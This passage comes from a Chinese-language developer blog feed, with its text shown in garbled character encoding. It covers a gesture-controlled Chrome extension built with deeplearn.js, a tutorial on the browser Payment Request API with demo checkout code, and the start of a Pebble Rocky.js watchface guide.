å…¶ä»–éƒ¨åˆ†ï¼Œåƒæ˜¯å¦‚ä½•è®“ WebCam çš„å½±åƒé¡¯ç¤ºåœ¨ &lt;video&gt; tag ä¸­çš„ç¨‹å¼ç¢¼ä¹Ÿæ˜¯åœ¨ popup.js ä¸­å¯¦ä½œã€‚
å®Œæ•´ popup.js ç¨‹å¼ç¢¼å¯ä»¥çœ‹ é€™è£ æˆ–æ˜¯åŸä½œè€…çš„
å¯¦ä½œåˆ°é€™è£¡ä»¥å¾Œï¼ŒåŸºæœ¬ä¸Šä½ å°±å¯ä»¥é–‹å•Ÿ Extension ç„¶å¾Œé€²è¡Œä¸€äº›å½±ç‰‡çš„åˆ†é¡ï¼Œåƒæ˜¯é€™æ¨£ï¼š

å¯ä»¥å¾ä¸Šé¢çš„ç‰‡æ®µç™¼ç¾ï¼Œä½ éœ€è¦é»æ“Šå°æ‡‰åˆ†é¡çš„æŒ‰éˆ•ï¼Œä¸¦ä¸”åšå‡ºä½ æƒ³è¦çš„å‹•ä½œä¾†æ•™å°ä½ çš„ extensionï¼Œè®“ä»–èªå¾—ä½ çš„æ‰‹å‹¢ï¼ç•¶ä½ çµ¦äºˆçš„ example è¶Šå¤šï¼Œå°±æ„ˆæœ‰æ©Ÿæœƒåˆ¤æ–·å¾—æ›´å¥½ã€‚
æ•´åˆ Extension - content.jsé€™é‚Šå‡å®šå¤§å®¶éƒ½çŸ¥é“ Extension çš„å¯¦ä½œæ–¹å¼ï¼ˆå¦‚æœä¸çŸ¥é“å¯ä»¥å¾é€™é‚Šå­¸ç¿’ï¼‰ã€‚
åœ¨ Extension ä¸­ï¼Œå¯ä»¥é€é chrome.runtime.sendMessage() èˆ‡ chrome.runtime.onMessage.addListener() ä¾†é‡å° Popup page èˆ‡ ç•¶å‰é é¢çš„ content script é€²è¡Œæºé€šï¼Œæˆ‘å€‘å°±æ˜¯åˆ©ç”¨é€™é»ä¾†å°‡è¾¨è­˜å®Œçš„æ‰‹å‹¢ï¼Œè½‰æ›æˆé é¢ä¸Šçš„äº’å‹•æ“ä½œï¼š
content.jschrome.runtime.onMessage.addListener(gotMessage)function gotMessage(message, sender, sendResponse)&#123;  let direction = 0;  if(message.direction == &#x27;up&#x27;)&#123;    direction = -500;  &#125; else if(message.direction == &#x27;down&#x27;)&#123;    direction = +500;  &#125; else if (message.direction == &#x27;turn off&#x27;) &#123;    const mask = document.getElementById(&#x27;body-maskDiv&#x27;);    if (mask) &#123;      removeMask();    &#125; else &#123;      addMask();    &#125;  &#125;  window.scrollBy(&#123;     top: direction,    left: 0,     behavior: &#x27;smooth&#x27;   &#125;);&#125;

åˆ°é€™é‚Šç‚ºæ­¢åŸºæœ¬ä¸Šå°±å®Œæˆäº†ç¯„ä¾‹çš„æ‰€æœ‰åŠŸèƒ½ï¼Œå°å®Œæ•´ç¨‹å¼ç¢¼ï¼ˆæˆ–æ˜¯é®ç½©å¯¦ä½œæ–¹å¼ XDï¼‰æœ‰èˆˆè¶£çš„äººå¯ä»¥å¾é€™é‚Šå–å¾—ã€‚
çµè«–é€™æ¬¡ç®—æ˜¯åˆæ­¥å˜—è©¦åœ¨å‰ç«¯ä¸Šæ‡‰ç”¨ ML ç›¸é—œçš„åŠŸèƒ½ï¼Œä»‹ç´¹å¤§å®¶æœ‰åƒæ˜¯ p5-deeplearn-js é€™æ¨£æœ‰è¶£çš„ library å¯ä»¥ä½¿ç”¨ï¼Œå¸Œæœ›å¯ä»¥æœ‰å¤šä¸€é»çš„å‰ç«¯é«˜æ‰‹ä¾†ç™¼æ®å‰µæ„ï¼Œä¸¦åˆ†äº«ä½œå“å‡ºä¾†ï¼Œä¸ç„¶çœŸçš„å¾ˆé›£æ‰¾åˆ°ç›¸é—œçš„ç¶“é©—åˆ†äº«ã€‚ä¸éç•¶ç„¶ï¼Œé€™åªæ˜¯å€‹éå¸¸ç²—æ·ºçš„æ‡‰ç”¨ï¼Œæ›´æ˜¯ç”¨éå¸¸ High level çš„ API ä¾†å¯¦ä½œï¼Œé‚„æ˜¯éœ€è¦çœŸæ­£å»äº†è§£ ML ç›¸é—œçš„æ¼”ç®—æ³•ï¼Œæ‰æ˜¯æ¯”è¼ƒæ­£ç¢ºçš„å­¸ç¿’æ–¹å‘ï¼Œæ¥ä¸‹ä¾†æˆ‘ä¹Ÿæœƒç¹¼çºŒå­¸ç¿’ï¼Œp5-deeplearn-js æœƒæ˜¯ä¸€å€‹ä¸éŒ¯çš„èµ·é»ï¼ŒåŠ ä¸Š deeplearn.js çš„ KNN æ¼”ç®—æ³•ç¨‹å¼ç¢¼éƒ½ç®—è »ç°¡æ½”çš„ï¼Œä»¥ Typescript å¯¦ä½œï¼Œé–±è®€èµ·ä¾†æ¯”èµ·ç´” JS å¥½ç†è§£ä¸€äº›ï¼ˆå¤šäº† Type å¾ˆæœ‰å¹«åŠ©å•Šï¼ï¼‰ï¼Œæ¨è–¦çµ¦å„ä½ï¼

è³‡æ–™ä¾†æº
p5-deeplearn-js
deeplearn-chrome_extension
deeplearnjs

é—œæ–¼ä½œè€…ï¼š@arvinh å‰ç«¯æ”»åŸç…ï¼Œç†±æ„›æ•¸æ“šåˆ†æå’Œè³‡è¨Šè¦–è¦ºåŒ–
]]></content>
      <tags>
        <tag>deeplearnjs</tag>
        <tag>deeplearning</tag>
        <tag>p5ML</tag>
        <tag>chrome extension</tag>
      </tags>
  </entry>
  <entry>
    <title>çµ±ä¸€ç¶²é æ”¯ä»˜ä»‹é¢ï¼šPayment Request API</title>
    <url>/2017/10/14/payment-request-api/</url>
    <content><![CDATA[å‰è¨€ä¹‹å‰åœ¨ Hacker News ä¸Šé¢çœ‹åˆ°äº†é€™ä¸€ç¯‡æ–‡ç« ï¼šPayment Request API â€” Now Being Implemented in All Major Browsersï¼Œå¤§æ„å°±æ˜¯ Payment Request API  é€™ä¸€å€‹æ±è¥¿å°‡æœƒåœ¨ä¸»æµç€è¦½å™¨ä¸Šé¢è¢«å¯¦ä½œå‡ºä¾†ã€‚
åœ¨é€™ä¹‹å‰ï¼Œæˆ‘å®Œå…¨æ²’æœ‰è½éé€™å€‹æ±è¥¿ï¼Œå®Œå…¨ä¸çŸ¥é“å®ƒåœ¨åšä»€éº¼ã€‚ä½†ç¶“éæˆ‘ç¨å¾®ç ”ç©¶ä¹‹å¾Œï¼Œç™¼ç¾é€™å€‹åŸä¾†æ˜¯ç¶²é æ”¯ä»˜ä»‹é¢çš„æœªä¾†ã€‚
Payment Request API ç°¡ä»‹åœ¨ç­è§£ä¸€é …æ–°äº‹ç‰©ä»¥å‰ï¼Œæˆ‘ç¿’æ…£å…ˆå¾ã€Œç›®çš„ã€ä¸‹æ‰‹ï¼Œå¦‚æœä½ çŸ¥é“é€™å€‹æ±è¥¿æ˜¯ç‚ºäº†è§£æ±ºä»€éº¼å•é¡Œè€Œèª•ç”Ÿï¼Œå°±èƒ½å°å®ƒæœ‰æœ€åŸºæœ¬çš„äº†è§£ã€‚
è€Œ Payment Request API èª•ç”Ÿçš„åŸå› å¾ˆç°¡å–®ï¼Œå°±æ˜¯ç‚ºäº†è§£æ±ºæ”¯ä»˜å•é¡Œï¼Œå°¤å…¶æ˜¯åœ¨æ‰‹æ©Ÿä¸Šçš„æ”¯ä»˜ã€‚
å…ˆä¸è¦è«‡æ‰‹æ©Ÿï¼Œæˆ‘å€‘å…ˆä¾†è«‡é›»è…¦ç«¯çš„æ”¯ä»˜å°±å¥½ã€‚
ç¾åœ¨æ¯å€‹è³¼ç‰©ç¶²ç«™éƒ½æœ‰ä¸åŒçš„æ”¯ä»˜ä»‹é¢ï¼Œä¸²æ¥è‘—ä¸åŒçš„é‡‘æµå» å•†ã€‚å‡è¨­æˆ‘ä»Šå¤©åœ¨è¦çš®è²·äº†ã€Šç´”ç²¹ç†æ€§æ‰¹åˆ¤ã€‹ï¼Œå¡«äº†ä¿¡ç”¨å¡è™Ÿç¢¼èˆ‡æ”¶è²¨åœ°å€ï¼Œè¦çš®è²¼å¿ƒçš„å¹«æˆ‘è¨˜ä½ï¼Œæ–¼æ˜¯ä¸‹ä¸€æ¬¡æˆ‘å†è³¼ç‰©æ™‚ï¼Œå°±ä¸å¿…å†å¡«æ”¶è²¨åœ°å€äº†ã€‚
å¯æ˜¯ï¼Œå¦‚æœä»Šå¤© PChome å•†å®¶ç ¸éŒ¢æ”¾é€å„ç¨®å„ªæƒ ï¼Œæˆ‘æ±ºå®šè½‰åˆ° PChome ä¸Šé¢è³¼ç‰©ï¼Œæˆ‘è²·äº†ä¸€æœ¬ã€Šå¤¢çš„è§£æã€‹ï¼Œå°±è¦å†å¡«äº†ä¸€æ¬¡ä¿¡ç”¨å¡è™Ÿç¢¼è·Ÿæ”¶è²¨åœ°å€ã€‚
å•é¡Œæ˜¯ä»€éº¼ï¼Ÿ
å•é¡Œæ˜¯æ¯ä¸€é–“å…¬å¸ã€æ¯ä¸€å€‹ç¶²ç«™çš„çµå¸³æµç¨‹è·Ÿä»‹é¢éƒ½ä¸ä¸€æ¨£ï¼Œé›–ç„¶å¤§åŒå°ç•°ï¼Œå¯æ˜¯é‚£äº›è³‡æ–™éƒ½æ˜¯æ²’æœ‰è¾¦æ³•å…±ç”¨çš„ã€‚å°±ç®—æˆ‘åœ¨ 100 å€‹ç¶²ç«™éƒ½å¡«äº†æ”¶è²¨åœ°å€ï¼Œæˆ‘åœ¨ç¬¬ 101 å€‹ç¶²ç«™é‚„æ˜¯è¦é‡æ–°å¡«ä¸€æ¬¡ï¼Œå› ç‚ºä»–æ²’æœ‰æˆ‘çš„è³‡æ–™ã€‚
ä¸Šé¢è¬›çš„æ˜¯æ¯ä¸€å€‹ç¶²ç«™æœ‰å·®ç•°çš„åœ°æ–¹ï¼Œé‚£æœ‰ä»»ä½•ç›¸åŒçš„åœ°æ–¹å—ï¼Ÿ
æœ‰ï¼Œé‚£å°±æ˜¯ä½ éƒ½ç”¨åŒä¸€å€‹ç€è¦½å™¨è³¼ç‰©ã€‚
ç€è¦½å™¨çš„åˆæ¬¡å˜—è©¦ï¼šè‡ªå‹•å¡«å…¥ä¸Šé¢èªªçš„æƒ…æ™¯å…¶å¯¦ä¸å¤ªæº–ç¢ºï¼Œå› ç‚ºä½ æ‡‰è©²æœƒç™¼ç¾å…¶å¯¦ç€è¦½å™¨æœƒè‡ªå‹•å¹«ä½ è¨˜æ†¶åœ°å€è·Ÿä¿¡ç”¨å¡ï¼Œå°±å¯ä»¥å¾ˆæ–¹ä¾¿åœ°ä½¿ç”¨è‡ªå‹•å¡«å…¥çš„åŠŸèƒ½ã€‚
ä¾‹å¦‚èªªåˆ·å¡çš„æ™‚å€™åªè¦åˆ·éä¸€æ¬¡ï¼Œå°±å¯ä»¥è®“ Chrome æŠŠé€™ä¸€å¼µçš„å¡çš„è³‡è¨Šè¨˜åœ¨ç€è¦½å™¨è£¡é¢ï¼Œä¸‹æ¬¡å†åˆ°åˆ¥çš„ç¶²ç«™åˆ·å¡æ™‚ï¼Œä½ åªè¦é»ä¸€ä¸‹è¼¸å…¥å¡è™Ÿçš„è¼¸å…¥æ¡†ï¼ŒChrome å°±æœƒæç¤ºä½ èªªå¯ä»¥ç”¨ä¹‹å‰çš„é‚£å¼µå¡ä¾†ä»˜è²»ã€‚
åœ°å€ä¹Ÿæ˜¯å¦‚æ­¤ï¼Œéƒ½æœ‰ç€è¦½å™¨å¹«ä½ è¨˜æ†¶èµ·ä¾†ï¼Œé€™æ¨£ä½ å°±åªè¦å¡«ä¸€æ¬¡ä¹‹å¾Œï¼Œä¹‹å¾Œéƒ½å¯ä»¥ç”± Chrome å¹«ä½ è‡ªå‹•å¡«å…¥ã€‚
å¯æ˜¯ï¼Œé€™æ¨£é‚„æœ‰ä¸€å€‹å•é¡Œï¼Œé‚£å°±æ˜¯çµå¸³çš„æµç¨‹è·Ÿä»‹é¢é‚„æ˜¯ä¸çµ±ä¸€ï¼Œå¤§å®¶éƒ½æœ‰è‡ªå·±ä¸åŒçš„å¯¦ä½œï¼Œæœ‰çš„æ”¯ä»˜ä»‹é¢ç°¡ç›´æ…˜ä¸å¿ç¹ï¼Œå°¤å…¶æ˜¯åœ¨æ‰‹æ©Ÿä¸Šï¼
æ ¹æ“š Google çš„çµ±è¨ˆï¼Œæœ‰ 65.9% çš„ä½¿ç”¨è€…åœ¨æ‰‹æ©Ÿä¸Šè³¼ç‰©æ™‚ï¼Œé‚„æ²’å®Œæˆæ‰€æœ‰æµç¨‹å°±é›¢é–‹äº†ã€‚é€™å·²ç¶“è¶…éä¸€åŠçš„ç”¨æˆ¶äº†ï¼Œä»£è¡¨è¨±å¤šç¶²ç«™åœ¨æ‰‹æ©Ÿçš„æ”¯ä»˜ä»‹é¢é€™ä¸€å¡Šé‚„æœ‰å¾ˆå¤§çš„åŠªåŠ›ç©ºé–“ã€‚
è€Œé€™ä¸€æ¬¡ï¼Œç€è¦½å™¨æ±ºå®šè‡ªå·±è·³ä¸‹ä¾†è§£æ±ºé€™å€‹å•é¡Œã€‚
ç€è¦½å™¨ï¼šéƒ½äº¤çµ¦æˆ‘å§ï¼ç€è¦½å™¨è¦æ€éº¼è§£æ±ºé€™å€‹ç—›é»ï¼Ÿ
ç°¡å–®ï¼åªè¦ç”±ç€è¦½å™¨æä¾›ä¸€å€‹çµ±ä¸€çš„çµå¸³ä»‹é¢å°±å¥½ï¼Œé€£æµç¨‹éƒ½ä¸€ä½µçµ±ä¸€ã€‚å•†å®¶çš„ç¶²é å¯ä»¥æ ¹æ“šéœ€æ±‚çš„ä¸åŒï¼Œå¸¶å…¥ä¸åŒçš„åƒæ•¸ï¼Œä½†æœ€çµ‚éƒ½æ˜¯å‘¼å«ç€è¦½å™¨æä¾›çš„ APIï¼ˆä¹Ÿå°±æ˜¯æˆ‘å€‘ä»Šå¤©çš„ä¸»è§’ï¼šPayment Request APIï¼‰ï¼Œå«å‡ºç€è¦½å™¨åŸç”Ÿçš„ä»‹é¢ã€‚
ç•¶é€™å€‹ API æ™®åŠä¸¦ä¸”å¤§å®¶éƒ½ç™¼ç¾æ¯”è¼ƒå¥½ç”¨çš„æ™‚å€™ï¼Œæ‰€æœ‰çš„ç¶²é éƒ½æœƒè·Ÿé€²ï¼Œéƒ½æœƒæ¡å–ä¸€æ¨£çš„æ–¹å¼ã€‚é€™æ¨£å°±èƒ½å¤ ç¢ºä¿æ‰€æœ‰ç¶²ç«™çš„æ”¯ä»˜æµç¨‹éƒ½çµ±ä¸€äº†ã€‚
æ‰€ä»¥ Payment Request API åˆ°åº•æ˜¯ä»€éº¼ï¼Ÿ
ç°¡å–®ä¾†èªªï¼Œå°±æ˜¯ç€è¦½å™¨æä¾›çš„ APIï¼Œç•¶ç¶²é ç«¯ä»¥ JavaScript å‘¼å«ä»¥å¾Œï¼Œå°±æœƒå‡ºç¾ç€è¦½å™¨åŸç”Ÿçš„çµå¸³ä»‹é¢ï¼Œç”¨ä¾†å–ä»£åŸæœ‰çš„å•†å®¶è‡ªæœ‰çš„çµå¸³æµç¨‹ã€‚

ç›´æ¥è®“ä½ çœ‹ä¸€å¼µåœ–å°±æœƒç†è§£äº†ï¼š

é€™å€‹å°±æ˜¯å‘¼å« API ä¹‹å¾Œçš„æ¨£å­ã€‚
è¦ç‰¹åˆ¥æ³¨æ„çš„ä¸€é»æ˜¯ Payment Request API è·Ÿå¾Œç«¯ã€Œå®Œå…¨ç„¡é—œã€ï¼Œä½ å¾Œç«¯å°±è·Ÿä»¥å‰ä¸€æ¨£æ¥æ”¶è³‡æ–™å³å¯ã€‚æœ‰è®Šå‹•çš„åœ°æ–¹æ˜¯å‰ç«¯ï¼ŒåŸæœ¬ä½ åœ¨å‰ç«¯éœ€è¦å¯«çš„é‚£äº›çµå¸³é é¢ï¼Œéƒ½å¯ä»¥äº¤ç”±ç€è¦½å™¨ä¾† render åŸç”Ÿçš„ UIï¼Œä½ åªè¦è² è²¬å‘¼å« Payment Request API å³å¯ã€‚
å‘¼å«ä»¥å¾Œå¯ä»¥æ‹¿åˆ°ä½¿ç”¨è€…å¡«å…¥çš„é‚£äº›è³‡æ–™ï¼ŒæŠŠé‚£äº›è³‡æ–™åƒä»¥å‰ä¸€æ¨£ç™¼é€åˆ° Server ç«¯å°±å¥½ã€‚
ä½†è¦æ³¨æ„çš„æ˜¯é€™å€‹ API é‚„ä¸æ™®åŠï¼Œæ ¹æ“š caniuse.com çš„è³‡æ–™ï¼Œåªæœ‰ Chrome 61 ç‰ˆã€Edge 15 è·Ÿ Opera 48 ä»¥ä¸Šæ‰æ”¯æ´ï¼Œå…¶ä»–çš„ç€è¦½å™¨é‚„è¦å†ç­‰ç­‰ã€‚
ä½¿ç”¨æµç¨‹èªªäº†é€™éº¼å¤šï¼Œç¾åœ¨å°±ä¾†å¯¦éš›è·‘ä¸€æ¬¡æµç¨‹å§ï¼
æˆ‘å€‘å…ˆå»ºç«‹ä¸€å€‹ç°¡å–®çš„ demo é é¢ï¼Œåµæ¸¬æ˜¯å¦æ”¯æ´ Payment Request ä»¥åŠæ”¾ç½®è³¼è²·æŒ‰éˆ•è·Ÿå›å‚³çš„çµæœï¼š

ç¬¬ä¸€æ­¥ï¼šå‰µé€  Payment Request ç‰©ä»¶PaymentRequestæ¥å—ä¸‰å€‹åƒæ•¸ï¼Œä»˜æ¬¾æ–¹å¼ã€äº¤æ˜“è³‡è¨Šè·Ÿå…¶ä»–ã€‚
var request = new PaymentRequest(  methodData, // æ”¯æ´çš„ä»˜æ¬¾æ–¹å¼  details,    // äº¤æ˜“ç›¸é—œçš„è©³ç´°è³‡è¨Š  options     // å…¶ä»–ï¼Œä¾‹å¦‚èªªé‹é€æ–¹å¼ç­‰ç­‰);

æˆ‘å€‘å…ˆå¯¦ä½œä¸€å€‹ç°¡å–®çš„ function å›å‚³å»ºç«‹å¥½çš„ PaymentRequestï¼š
function createPaymentRequest () &#123;  var methodData = [&#123;    supportedMethods: [&#x27;basic-card&#x27;], // æ”¯æ´ä¿¡ç”¨å¡    data: &#123; // æŒ‡å®šæ›´è©³ç´°çš„è³‡è¨Š      supportedNetworks: [&#x27;jcb&#x27;, &#x27;mastercard&#x27;, &#x27;visa&#x27;],       supportedTypes: [&#x27;debit&#x27;, &#x27;credit&#x27;, &#x27;prepaid&#x27;]    &#125;,  &#125;];  var details = &#123;    displayItems: [ // è³¼è²·çš„å“é …      &#123;        label: &quot;TechBridge Weekly å°ˆæ¥­ç‰ˆä¸€å¹´ä»½&quot;,        amount: &#123; currency: &quot;TWD&quot;, value : &quot;3000.00&quot; &#125;      &#125;,      &#123;        label: &quot;æ—©é³¥å„ªæƒ &quot;,        amount: &#123; currency: &quot;TWD&quot;, value : &quot;-300.00&quot; &#125;      &#125;    ],    total:  &#123;      label: &quot;ç¸½é¡&quot;,      amount: &#123; currency: &quot;TWD&quot;, value : &quot;2700.00&quot; &#125;    &#125;  &#125;;    return new PaymentRequest(methodData, details);&#125;

é€™é‚Šæœ‰ä¸€é»è¦ç‰¹åˆ¥æ³¨æ„ï¼Œé‚£å°±æ˜¯totalé‚£é‚Šçš„ç¸½é¡ï¼Œç³»çµ±ã€Œä¸æœƒå¹«ä½ è‡ªå·±ç®—å¥½ã€ï¼Œæ‰€ä»¥å„˜ç®¡ä¸Šé¢ç¸½å’Œæ˜¯ 2700ï¼Œä½ è¦è¼¸å…¥å…¶ä»–æ•¸å­—ä¹Ÿå¯ä»¥ã€‚
é‚„æœ‰å¦ä¸€å€‹æ¢ä»¶æ˜¯é€™å€‹ API ä¸æ”¯æ´é€€æ¬¾ï¼Œæ‰€ä»¥ç¸½å’Œå¿…é ˆæ˜¯æ­£æ•¸ã€‚ä½†æ˜¯æ¯ä¸€å€‹å“é …å¯ä»¥æ˜¯è² æ•¸ï¼Œé€™æ¨£å°±å¯ä»¥æ”¾ä¸€äº›æŠ˜æ‰£ç›¸é—œçš„æ±è¥¿ã€‚
ç¬¬äºŒæ­¥ï¼šå‘¼å« APIï¼Œé¡¯ç¤ºçµå¸³é é¢å»ºç«‹å®Œ PaymentRequest ä¹‹å¾Œï¼Œå¯ä»¥ç”¨.show()é¡¯ç¤ºçµå¸³ UIï¼Œæœƒå›å‚³ä¸€å€‹ Promiseï¼Œä½¿ç”¨éå¾Œå¯ä»¥æ‹¿åˆ°ä½¿ç”¨è€…çš„ç›¸é—œè³‡æ–™ã€‚æˆ‘å€‘åœ¨è³¼è²·æŒ‰éˆ•æŒ‰ä¸‹å»ä¹‹å¾Œä¾†é€²è¡Œçµå¸³æµç¨‹ã€‚
function onClick () &#123;  var request = createPaymentRequest();  request.show().then(function(PaymentResponse) &#123;    handleResponse(PaymentResponse);  &#125;).catch(function(err) &#123;    console.log(err);  &#125;);&#125;

ç¬¬ä¸‰æ­¥ï¼šè™•ç†è³‡æ–™åŠå›å‚³çµæœæœ€å¾Œä¸€æ­¥å°±æ˜¯è™•ç†ä¸Šä¸€æ­¥æ‹¿åˆ°çš„è³‡æ–™ï¼ŒæŠŠé‚£äº›è³‡è¨Šç™¼é€åˆ° Server å»å®Œæˆçµå¸³æµç¨‹ï¼Œä¸¦ä¸”å‚³å›çµæœï¼Œè®“ UI é¡¯ç¤ºæˆåŠŸæˆ–æ˜¯å¤±æ•—ã€‚æˆ‘å€‘åœ¨é€™é‚Šåªæ˜¯ç¯„ä¾‹ï¼Œæ‰€ä»¥å°±çœç•¥ä¸Šè¿°æ­¥é©Ÿï¼Œä¸¦ä¸”ç›´æ¥æŠŠä¸Šä¸€æ­¥æ‹¿åˆ°çš„è³‡æ–™è½‰æˆ JSON é¡¯ç¤ºå‡ºä¾†ã€‚
function showResponse (response) &#123;  $res.innerHTML = JSON.stringify(response, undefined, 2);&#125;  function handleResponse (paymentResponse) &#123;  // å¯ä»¥åœ¨é€™è£¡æŠŠçµæœå›å‚³ server  // åªæ˜¯ç¤ºç¯„ï¼Œæ‰€ä»¥æˆ‘å€‘ç›´æ¥å°‡è³‡æ–™é¡¯ç¤ºå‡ºä¾†  showResponse(paymentResponse);  // æ¨¡æ“¬ API çš„å»¶é²  setTimeout(function () &#123;    // çµå¸³æˆåŠŸ    paymentResponse.complete(&quot;success&quot;);  &#125;, 2000);&#125;


ï¼ˆé€™é‚Šçš„å¡è™Ÿæ˜¯æˆ‘åœ¨ http://www.getcreditcardnumbers.com/ éš¨ä¾¿ç”¢ç”Ÿçš„ï¼‰
åªè¦ä¸Šé¢ç°¡å–®çš„ä¸‰å€‹æ­¥é©Ÿï¼Œå°±èƒ½å¤ å–å¾—ä½¿ç”¨è€…çš„è³‡æ–™ä¸¦ä¸”å®Œæˆçµå¸³ã€‚æ¯”èµ·åŸå…ˆæ¯å€‹ç¶²ç«™å»ºç«‹çš„è‡ªæœ‰çµå¸³æµç¨‹ï¼Œä½¿ç”¨ Payment Request API çš„å¥½è™•å°±æ˜¯å¯ä»¥å¸¶çµ¦ä½¿ç”¨è€…åŸç”Ÿçš„çµå¸³é«”é©—ï¼Œé€²è€Œå¢åŠ è½‰æ›ç‡ã€‚
è€Œä¸Šé¢çš„ä¸‰å€‹æ­¥é©Ÿï¼Œæœ€é‡è¦çš„å°±æ˜¯ç¬¬ä¸€å€‹å¸¶å…¥åƒæ•¸çš„éƒ¨åˆ†ï¼Œé€™é‚Šé‚„æœ‰å¾ˆå¤šç´°ç¯€å¯ä»¥èª¿æ•´ï¼Œä¾‹å¦‚èªªè²¨å¹£ç¨®é¡ã€è¦æ±‚é‹é€åœ°å€ï¼Œä¸¦ä¸”å¯ä»¥æ ¹æ“šä½¿ç”¨è€…é¸æ“‡çš„åœ°å€åˆ¤æ–·æ¥å—æˆ–æ˜¯ä¸æ¥å—ï¼ˆä¾‹å¦‚èªªä¸æ¥å—é€è²¨åˆ°åœ‹å¤–ï¼Œå°±èƒ½åœ¨é‚£é‚Šåˆ¤æ–·ï¼‰ã€‚
æ”¯ä»˜æ–¹å¼ä¹Ÿå¯ä»¥æŒ‡å®šæŸå¹¾é–“çš„ä¿¡ç”¨å¡ï¼Œæˆ–ç”šè‡³æ˜¯æ±ºå®šè¦ä¸è¦æ”¯æ´ debit cardã€‚
å¦‚æœä½ å°é€™äº›ç´°é …æœ‰èˆˆè¶£ï¼Œå¯ä»¥åƒè€ƒ Google æä¾›çš„éå¸¸è©³ç´°çš„æ•™å­¸ï¼šDeep Dive into the Payment Request APIã€‚
åŸç”Ÿçµå¸³ UIå¦‚æœä½ æƒ³è‡ªå·±è·‘ä¸€éçµå¸³æµç¨‹ï¼Œå¯ä»¥ç›´æ¥å» demo ç¶²é  è©¦è©¦çœ‹ã€‚
åœ¨é€™é‚Šæˆ‘ç›´æ¥æˆªåœ–çµ¦å¤§å®¶çœ‹åœ¨é›»è…¦ä»¥åŠæ‰‹æ©Ÿä¸Šé¢çš„çµå¸³æµç¨‹ã€‚
é›»è…¦æŒ‰ä¸‹æŒ‰éˆ•ä¹‹å¾Œçš„ç•«é¢ï¼š
é»é€²è¨‚å–®æ‘˜è¦ï¼š
æ–°å¢ä¿¡ç”¨å¡ï¼š
æ–°å¢åœ°å€ï¼š
æŒ‰ä¸‹æ”¯ä»˜ä¹‹å¾Œï¼Œè¦æ±‚è¼¸å…¥æœ«ä¸‰ç¢¼ï¼š
çµå¸³å¤±æ•—ï¼š
æ‰‹æ©ŸæŒ‰ä¸‹æŒ‰éˆ•ä¹‹å¾Œçš„ç•«é¢ï¼š
é»é€²è¨‚å–®æ‘˜è¦ï¼š
æ–°å¢ä¿¡ç”¨å¡ï¼š
æ–°å¢åœ°å€ï¼š
çµå¸³å¤±æ•—ï¼š
ç¸½çµPayment Request API æ­£åœ¨è¢«å…¶ä»–ç€è¦½å™¨ï¼ˆä¾‹å¦‚èªª Safariï¼‰å¯¦ä½œï¼Œå¯ä»¥é æœŸåˆ°å°‡ä¾†å¿…å®šæœƒè¢«å»£æ³›æ”¯æ´ã€‚
å…¶å¯¦åœ‹å¤–çš„é‡‘æµå» å•† Stripe å·²ç¶“æ”¯æ´ä½¿ç”¨ Payment Request API äº†ã€‚è€Œ PaymentRequest Sample é€™å€‹ç¶²ç«™ä¹Ÿå¯ä»¥çœ‹åˆ°æ›´å¤šæ¨£åŒ–çš„ç¯„ä¾‹ã€‚
é€™ç¯‡æ–‡ç« ä¸»è¦ç›®çš„æ˜¯æŠŠé€™é …æ–°çš„æ¨™æº–å¸¶åˆ°å¤§å®¶é¢å‰ï¼Œå¦‚æœè¦ºå¾—å¾ˆæœ‰èˆˆè¶£æƒ³è¦æ·±å…¥ç ”ç©¶ï¼Œåº•ä¸‹æœ‰é™„ä¸Šè¨±å¤šç›¸é—œè³‡æºã€‚
åƒè€ƒè³‡æ–™ï¼š

MDN - Payment Request API
Deep Dive into the Payment Request API
Introducing the Payment Request API
PaymentRequest Credit Cards Sample
w3c&#x2F;payment-request-info FAQ

é—œæ–¼ä½œè€…ï¼š@huli é‡ç”Ÿå·¥ç¨‹å¸«ï¼Œç›¸ä¿¡åˆ†äº«èˆ‡äº¤æµèƒ½è®“ä¸–ç•Œè®Šå¾—æ›´ç¾å¥½
]]></content>
      <tags>
        <tag>payment request</tag>
      </tags>
  </entry>
  <entry>
    <title>ä¸€å°æ™‚å…§è£½ä½œè‡ªå·±çš„ Pebble éŒ¶é¢</title>
    <url>/2016/11/19/pebble-rocky-watchface/</url>
    <content><![CDATA[ç­†è€…ã€Œæœ€è¿‘ã€è²·äº†ä¸€éš» Pebble 2ï¼Œå¤§æ¦‚æ˜¯åŠå¹´å¤šå‰çš„äº‹æƒ…â€¦ç•¶åˆçœ‹ä¸Šä»–ä¾¿å®œä¿¡è­½å¥½ï¼Œåˆå¯ä»¥ç”¨ javascript æ’°å¯«è‡ªå·±çš„ watch faceï¼Œæ‰€ä»¥å°±åˆ·ä¸‹å»äº†ï¼Œç®—æ˜¯ç¬¬ä¸€æ¬¡åœ¨ kickstarter ä¸Šé¢è´ŠåŠ©ç”¢å“ï¼Œç­‰å¾…çš„æ™‚é–“ä¹…åˆ°æˆ‘éƒ½å¿«å¿˜äº†â€¦.æ‰æ€ªï¼Œæˆ‘å¤§æ¦‚æ¯å€‹æœˆéƒ½æœƒæƒ³èµ·ä¾†ä¸€æ¬¡ XD
ç¸½ä¹‹ï¼Œç¶“éå¹¾å€‹æœˆæ¼«é•·ç­‰å¾…ï¼Œä»¥åŠç¶²ç«™ä¸Šè·Ÿæˆ‘ä¸€æ¨£æƒ³è¶•å¿«æ‹¿åˆ°ç”¢å“çš„ baker å€‘ä¸æ–·åœ°è©¢å•ä¸‹ï¼Œçµ‚æ–¼é‚„æ˜¯é€åˆ°æˆ‘æ‰‹ä¸Šäº†ï¼
Tada ~!
â€¦ä¸å°é€™ç¯‡ä¸æ˜¯é–‹ç®±æ–‡
æˆ‘ä»Šå¤©è¦ä¾†ç°¡ä»‹ä¸€ä¸‹å¦‚ä½•ç”¨ Pebble æä¾›çš„ Rocky.js Javascript API ä¾†é–‹ç™¼ Pebble watchfaceï¼Œè®“ä½ å¯ä»¥å®‰è£åˆ°è‡ªå·±çš„æ‰‹éŒ¶ä¸Šï¼
Build your very first pebble watchfacePebble çš„å®˜ç¶²å…§å®¹è »è±å¯Œçš„ï¼Œå¾ç°¡å–®çš„æ•™å­¸ã€API Doc åˆ°ä½¿ç”¨è€…è«–å£‡èˆ‡ blog éƒ½æœ‰ã€‚


